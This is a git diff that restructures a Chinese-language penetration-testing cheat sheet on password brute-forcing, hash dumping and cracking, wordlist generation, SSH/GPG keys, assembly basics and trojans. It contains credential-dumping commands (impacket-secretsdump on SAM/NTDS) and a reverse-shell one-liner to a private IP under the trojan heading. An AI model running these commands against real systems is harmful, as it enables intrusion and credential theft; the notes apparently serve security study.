@@ -1,22 +1,12 @@
-# 凭据(密码,hash,私钥公钥),二进制(exp,逆向和pwn,木马)
+# Credential_Binary
 
 [TOC]
 
-------
+## Credential
 
-## tools
+#### 密码破解
 
-hydra，impacket-secretsdump，cupp，cewl，crunch
-
-hashcat，john，*2john，hash-identifier ，hashid，nth，oclpenssl，mkpasswd
-
-openssl
-
-------
-
-## 密码破解
-
-#### hydra
+###### hydra
 
 ```
 -l -L -p -P   单个用户名，用户名字典，单个密码，密码字典
@@ -32,11 +22,9 @@ ip ssh 或 ssh://  两种格式
 http一般用burp等图形化工具
 ```
 
+#### 密码导出
 
-
-------
-
-## 密码导出
+###### impacket-secretsdump
 
 ```
 reg save hklm\sam sam.hive
@@ -52,13 +40,9 @@ impacket-secretsdump -system system.hive -ntds ntds.dit LOCAL #离线
 impacket-secretsdump two/win2019:root@192.168.12.5 #在线
 ```
 
+#### 密码生成
 
-
-------
-
-## 密码生成
-
-#### cupp
+###### cupp
 
 ```
 cupp -i
@@ -68,7 +52,7 @@ cupp -i
 cupp -w file.txt   从文件中生成
 ```
 
-#### cewl
+###### cewl
 
 ```
 -d 深度 默认2
@@ -90,7 +74,7 @@ cewl http://www.baidu.com/
 \#爬虫字典生成
 ```
 
-#### crunch
+###### crunch
 
 ```
 crunch 1 1 -p i love you
@@ -120,11 +104,9 @@ d 原本字符匹配(-p)
 hashcat --stdout dict -r best66.rule > dict.best66  #规则生成字典
 ```
 
-------
+#### hash破解
 
-## hash破解
-
-#### hashcat
+###### hashcat
 
 ```
 sudo hashcat -m 100 admin.hash /usr/share/wordlists/rockyou.txt --potfile-disable
@@ -170,7 +152,7 @@ hashcat -a6 哈希文件 字典文件 ?d?d?d?d
 hashcat -a7 哈希文件 ?d?d?d?d 字典文件
 ```
 
-#### john
+###### john
 
 ```
 john word.hash [--wordlist=/usr/share/wordlists/rockyou.txt] --pot=drvier.pot
@@ -194,43 +176,65 @@ locate -i *2john
 rar2john 1.rar > 1.rar.hash #破解rar加密的密钥
 ```
 
-------
+#### hash识别
 
-## hash识别
+###### hash-identifier
 
 ```
 hash-identifier hash
+```
 
+###### hashcat
+
+```
 hashcat --identify hash.hash
+```
 
- 
+###### hashid
 
+```
 hashid -jm hash.hash    -j -m 识别并指出hash在john和hashcat中的编号和格式
+```
 
+###### nth
+
+```
 nth -t '$5$TOHC28EqgzhS9EWg$M.EzKtwKRuqgj3jVtzT53EGd8kwgqrjcbnBUUEMgIU.'
+```
 
-https://www.tunnelsup.com/hash-analyzer/
+###### hash-analyzer.com
 
+```
+www.tunnelsup.com/hash-analyzer
+```
+
+###### cmd5.com
+
+```
 cmd5.com
 ```
 
-------
+#### hash生成
 
-## hash生成
+###### openssl
 
 ```
 echo '123123' | openssl md5
 
 openssl passwd -6 123
-
-mkpasswd -m sha512crypt 123
-
-mkpasswd -m sha512crypt -S '12345678' '123'   -S 加盐
 ```
 
-------
+###### mkpasswd
 
-## ssh公钥私钥
+```
+mkpasswd -m sha512crypt 123
+
+mkpasswd -m sha512crypt -S '12345678' '123' #-S 加盐
+```
+
+#### ssh公钥私钥
+
+###### ssh-keygen
 
 ```
 ssh-keygen
@@ -240,9 +244,7 @@ cp id_rsa.pub ~/.ssh/authorized_keys
 ssh -i id_rsa root@xxx.xxx.xxx.xxx
 ```
 
-------
-
-## gpg解密
+#### gpg解密
 
 ```
 gpg --import privkey.gpg  #导入密钥
@@ -253,20 +255,12 @@ gpg --list-keys #查看导入私钥
 
 gpg --delete-secret-keys "xx@xxxx" #删除导入私钥
 
- rm -rf ~/.gnupg #删除密钥存储位置
+rm -rf ~/.gnupg #删除密钥存储位置
 ```
 
+## Binary
 
-
-
-
-
-
-# 二进制(exp,逆向和pwn,木马)
-
-------
-
-exp
+#### exp
 
 searchsploit 
 
@@ -290,7 +284,43 @@ sudo -s | grep version
 
 ------
 
-逆向和pwn
+#### 逆向和pwn
+
+###### 汇编
+
+mov eax，5
+
+mov ebx，12
+
+mul/imul ebx
+
+mov edx，0
+
+mov eax, 7
+
+mov ebx,2
+
+div ebx
+
+![img](D:\communication\wechat\Documents\xwechat_files\wxid_vzo12jkdo61622_6285\business\favorite\temp\微信图片_20260215224704_1278.jpg)
+
+
+
+函数返回值存储在eax中
+
+mingw32
+
+x86_64-w64-mingw32-gcc hello.c -o hello.exe # 64位程序
+
+i686-w64-mingw32-gcc hello.c -o hello.exe # 32位程序
+
+gcc -S test.c -o test.s
+
+gcc -c test.s -o test.o
+
+gcc test.o -o test.elf
+
+
 
 ![img](D:\communication\wechat\Documents\xwechat_files\wxid_vzo12jkdo61622_6285\business\favorite\temp\微信图片_20260215224704_1272.jpg)
 
@@ -376,9 +406,7 @@ binutil
 
 valgrind
 
-------
-
-木马
+#### 木马
 
 find . -exec /bin/bash -c -p "/bin/bash -p -i >& /dev/tcp/192.168.136.128/666 0>&1" {} \;
 
@@ -404,38 +432,3 @@ sfx.exe #自解压压缩包
 
 ahmyth
 
-------
-
-汇编
-
-mov eax，5
-
-mov ebx，12
-
-mul/imul ebx
-
-mov edx，0
-
-mov eax, 7
-
-mov ebx,2
-
-div ebx
-
-![img](D:\communication\wechat\Documents\xwechat_files\wxid_vzo12jkdo61622_6285\business\favorite\temp\微信图片_20260215224704_1278.jpg)
-
-
-
-函数返回值存储在eax中
-
-mingw32
-
-x86_64-w64-mingw32-gcc hello.c -o hello.exe # 64位程序
-
-i686-w64-mingw32-gcc hello.c -o hello.exe # 32位程序
-
-gcc -S test.c -o test.s
-
-gcc -c test.s -o test.o
-
-gcc test.o -o test.elf
